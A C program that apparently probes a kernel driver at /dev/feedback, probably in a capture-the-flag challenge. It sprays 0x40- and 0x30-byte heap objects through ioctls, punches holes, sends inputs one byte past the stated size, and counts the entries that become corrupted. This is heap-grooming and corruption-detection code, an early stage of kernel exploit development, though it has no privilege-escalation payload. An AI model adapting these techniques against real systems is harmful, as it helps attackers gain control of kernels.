#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define DEV "/dev/feedback"
#define CMD_CREATE 0xc0207300u
#define CMD_DELETE 0xc0207301u
#define CMD_READ   0xc0207302u

struct request {
    uint64_t id;
    uint64_t size;
    char *name;
    char *feedback;
};

static int xioctl(int fd, uint32_t cmd, struct request *req) {
    errno = 0;
    return ioctl(fd, cmd, req);
}

static int create_fb(int fd, uint64_t id, uint64_t size, unsigned char fill, unsigned char ov) {
    char *name = malloc(0x100);
    char *body = malloc(size + 1);
    if (!name || !body) exit(1);
    memset(name, 0x4e, 0xff);
    memset(body, fill, size);
    body[size] = (char)ov;
    struct request req = { .id = id, .size = size, .name = name, .feedback = body };
    int rc = xioctl(fd, CMD_CREATE, &req);
    free(name);
    free(body);
    return rc;
}

static int read_fb(int fd, uint64_t id, char *out, size_t outsz) {
    memset(out, 0, outsz);
    struct request req = { .id = id, .size = 0, .name = NULL, .feedback = out };
    return xioctl(fd, CMD_READ, &req);
}

static int del_fb(int fd, uint64_t id) {
    struct request req = { .id = id, .size = 0, .name = NULL, .feedback = NULL };
    return xioctl(fd, CMD_DELETE, &req);
}

static int is_hole(int i) {
    return ((i % 3) == 0 || (i % 11) == 0);
}

int main(void) {
    int fd = open(DEV, O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    const int n40 = 180;
    const int n30 = 220;
    const uint64_t base40 = 0xB00000;
    const uint64_t base30 = 0xC00000;
    const uint64_t refill = 0xD00000;
    char out[0x80];

    for (int i = 0; i < n40; i++) {
        create_fb(fd, base40 + i, 0x40, (unsigned char)(0x40 + (i % 40)), 0x5a);
    }
    for (int i = 0; i < n40; i++) {
        if (is_hole(i)) del_fb(fd, base40 + i);
    }
    for (int i = 0; i < n30; i++) {
        create_fb(fd, base30 + i, 0x30, 0x31, (unsigned char)i);
    }
    for (int i = 0; i < 320; i++) {
        create_fb(fd, refill + i, 0x40, 0x44, (unsigned char)((0x80 + i) & 0xff));
    }

    puts("[+] classify broken IDs");
    int broken = 0;
    int eno22 = 0;
    int eno14 = 0;
    int eno2 = 0;
    int del_fail = 0;

    for (int i = 0; i < n40; i++) {
        if (is_hole(i)) continue;
        uint64_t id = base40 + i;
        int rc = read_fb(fd, id, out, sizeof(out));
        if (rc == 0) continue;
        broken++;
        if (errno == 22) eno22++;
        else if (errno == 14) eno14++;
        else if (errno == 2) eno2++;

        int saved = errno;
        int drc = del_fb(fd, id);
        int derr = errno;
        if (drc != 0) del_fail++;

        if (broken <= 16) {
            printf("BROKEN id=%llu read_errno=%d del_rc=%d del_errno=%d\n",
                   (unsigned long long)id, saved, drc, derr);
        }
    }

    printf("[+] broken=%d eno22=%d eno14=%d eno2=%d del_fail=%d\n",
           broken, eno22, eno14, eno2, del_fail);

    for (int i = 0; i < n40; i++) del_fb(fd, base40 + i);
    for (int i = 0; i < n30; i++) del_fb(fd, base30 + i);
    for (int i = 0; i < 320; i++) del_fb(fd, refill + i);

    close(fd);
    return 0;
}
